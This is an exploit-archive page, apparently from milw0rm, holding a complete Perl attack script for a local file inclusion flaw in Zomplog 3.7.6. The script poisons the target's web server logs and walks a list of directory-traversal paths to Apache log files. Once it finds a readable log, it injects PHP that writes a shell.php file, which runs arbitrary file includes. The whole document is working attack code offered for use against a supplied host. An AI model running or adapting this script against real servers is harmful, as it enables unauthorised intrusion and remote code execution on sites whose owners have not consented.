<html><head><title>Zomplog <= 3.7.6 Local File Inclusion Vulnerabilty (win32)</title></head><pre>#Made by Bl0od3r
#tech-bl0od3r.blogspot.com

use IO::Socket;
use Switch;
{
$port = &quot;80&quot;; #
$target = @ARGV[0]; # 
$folder = @ARGV[1]; # 
@paths=(
&quot;../../../../../var/log/httpd/access_log&quot;,
&quot;../../../../../var/log/httpd/error_log&quot;,
&quot;../apache/logs/error.log&quot;,
&quot;../apache/logs/access.log&quot;,
&quot;../../apache/logs/error.log&quot;,
&quot;../../apache/logs/access.log&quot;,
&quot;../../../apache/logs/error.log&quot;,
&quot;../../../apache/logs/access.log&quot;,
&quot;../../../../apache/logs/error.log&quot;,
&quot;../../../../apache/logs/access.log&quot;,
&quot;../../../../../apache/logs/error.log&quot;,
&quot;../../../../../apache/logs/access.log&quot;,
&quot;../logs/error.log&quot;,
&quot;../logs/access.log&quot;,
&quot;../../logs/error.log&quot;,
&quot;../../logs/access.log&quot;,
&quot;../../../logs/error.log&quot;,
&quot;../../../logs/access.log&quot;,
&quot;../../../../logs/error.log&quot;,
&quot;../../../../logs/access.log&quot;,
&quot;../../../../../logs/error.log&quot;,
&quot;../../../../../logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/access_log&quot;,
&quot;../../../../../etc/httpd/logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/error_log&quot;,
&quot;../../../../../etc/httpd/logs/error.log&quot;,
&quot;../../../../../var/www/logs/access_log&quot;,
&quot;../../../../../var/www/logs/access.log&quot;,
&quot;../../../../../usr/local/apache/logs/access_log&quot;,
&quot;../../../../../usr/local/apache/logs/access.log&quot;,
&quot;../../../../../var/log/apache/access_log&quot;,
&quot;../../../../../var/log/apache/access.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/www/logs/error_log&quot;,
&quot;../../../../../var/www/logs/error.log&quot;,
&quot;../../../../../usr/local/apache/logs/error_log&quot;,
&quot;../../../../../usr/local/apache/logs/error.log&quot;,
&quot;../../../../../var/log/apache/error_log&quot;,
&quot;../../../../../var/log/apache/error.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/log/error_log&quot;,
&quot;../../../apache/logs/access.log&quot;
);

$sack_bad=IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;$target,PeerPort=&gt;$port) || die &quot;[Error while connecting]\n&quot;;
print $sack_bad &quot;GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1\n&quot;;
print $sack_bad &quot;Host: $target\n&quot;;
print $sack_bad &quot;Connection: close\n&quot;;
close($sack_bad);

###################################################################################################################################

$sack_good=IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;$target,PeerPort=&gt;$port) || die &quot;[Error while connecting]\n&quot;;
print $sack_good &quot;GET /index.php?&amp;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1\n&quot;;
print $sack_good &quot;Host: $target\n&quot;;
print $sack_good &quot;Connection: close\n&quot;;
close($sack_good);
###################################################################################################################################

print &quot;[+]Fake paths created.\n&quot;;

foreach $path (@paths)
{
        $sock = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $target, PeerPort =&gt; $port) || die &quot;[Error while connecting]\n&quot;;
        print $sock &quot;GET &quot;.$folder.&quot;themes/default/?theme[options]=232222&amp;settings[skin]=&quot;.$path.&quot;%00 HTTP/1.1\n&quot;;
        print $sock &quot;Host: $target\n&quot;;
        print $sock &quot;Accept: text/html\n&quot;;
        print $sock &quot;Connection: close\n\n\r\n&quot;;
        while ($answer = &lt;$sock&gt;) {
$out.=$answer;
 }

        if ($out =~ m/AAAAAAAAAAAAAAAAAAAAAAAAAAA/) {
print &quot;Found-&gt;[&quot;.$path.&quot;]&quot;;
&amp;code();
}

}

sub code() {
$code_sock=IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;$target,PeerPort=&gt;$port) || die &quot;[Error while connecting]\n&quot;;
print $code_sock &quot;GET /&lt;?php \$file=fopen('shell.php','w');fwrite(\$file,'&lt;?php include(\$_GET[file]) ?&gt;'); ?&gt; HTTP/1.1\n&quot;;
print $code_sock &quot;Host: $target\n&quot;;
print $code_sock &quot;Connection: close\n\n&quot;;

print &quot;\n[+]Bad Code Injected\n&quot;;

&amp;cmd();
}

sub cmd() {
print &quot;[+]Successfully created:shell.php\n&quot;;
exit;
}
}

# milw0rm.com [2007-03-14]</pre></html>